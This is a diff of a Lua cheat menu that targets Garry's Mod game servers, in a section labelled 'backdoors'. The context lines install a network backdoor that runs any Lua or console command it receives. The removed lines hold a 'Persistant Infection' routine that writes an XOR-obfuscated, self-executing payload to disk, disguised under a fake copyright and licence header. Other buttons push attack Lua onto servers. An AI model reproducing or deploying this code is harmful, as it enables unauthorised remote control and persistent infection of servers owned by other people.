@@ -1580,21 +1580,6 @@ Panels 2 : backdoors :)
             noob.PostLua([[util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)]])
         end)
 
-        rebug.AddButton("@Persistant Infection", Bar1, function()
-            surface.PlaySound("buttons/button18.wav")
-            noob.PostLua([[if not file.Exists("xeon", "DATA") then
-				file.CreateDir("xeon")
-				end
-				if file.Exists("xeon", "DATA") then
-				file.Write("xeon/xeon.dat",[=[
--- Copyright © 2018 William Venner
--- Tampering will result in immediate automatic license revokation
-
-key="PASSWORD"local a=loadstring((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({287,238,149,337,258,223,348,233,250,276,244,148,259,338,124,299,362,143,277,353,319,164,194,229,327,364,232,247,227,196,295,142,313,207,127,322,261,186,208,360,255,139,202,270,312,302,363,241,333,181,321,151,130,141,288,222,266,274,166,239,264,135,349,152,219,218,162,212,157,263,294,314,204,357,190,291,184,355,197,365,156,275,169,356,315,245,343,269,256,144,213,138,189,354,220,230,304,140,251,311,310,301,246,331,334,136,282,187,221,307,193,267,174,328,326,133,292,225,297,330,-1,103,140,56,23,117,135,17,20,254,23,238,67,76,160,85,73,161,22,36,4,75,75,0,17,132,252,173,3,11,182,0,80,231,225,146,35,6,34,22,68,13,16,162,66,126,9,192,207,17,34,112,80,66,27,56,232,65,192,197,93,12,215,153,17,181,66,16,57,95,76,70,248,17,29,3,10,21,53,91,63,22,85,190,11,185,251,4,33,214,119,210,11,21,149,79,122,227,3,73,74,11,12,23,194,11,11,23,119,0,23,117,74,11,22,101,197,83,16,0,204,69,146,219,66,77,74,29,9,232,2,17,85,227,59,49,17,203,17,12,100,73,111,17,77,201,31,23,30,13,76,69,13,167,21,0,77,4,206,229,245,157,55,199,177,18,53,32,54,197,200,13,0,120,27,11,210,1,124,75,68,6,66,81,19,95,137,54,56,165,6,75,76,1,10,26,64,148,192,77,206,8,66,116,30,8,2,10,11,19,76,21,242,17,66,128,57,54,9,210,220,20,157,66,81,77,64,82,12,75,26,222,87,1,74,17,6,77,178,80,36,136,55,76,11,75,26,225,113},key))if a then a()else print("bruh")end]=])
-
-			end]])
-        end)
-
         rebug.AddButton("Artillery Server Strike", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[if !bombstrike then
